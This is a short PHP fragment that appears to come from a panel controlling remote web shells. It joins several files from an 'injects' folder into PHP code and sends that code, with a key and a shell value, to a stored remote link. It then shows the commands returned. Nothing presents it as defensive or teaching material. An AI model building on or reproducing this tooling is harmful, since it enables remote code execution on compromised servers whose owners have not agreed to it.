<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	if($result->id == $Cur['id']){
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_deldev_cmd.php');
		$cmds = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$smarty->assign('admin', $result);
		$smarty->assign('cmds', json_decode($cmds));
	}
}

?>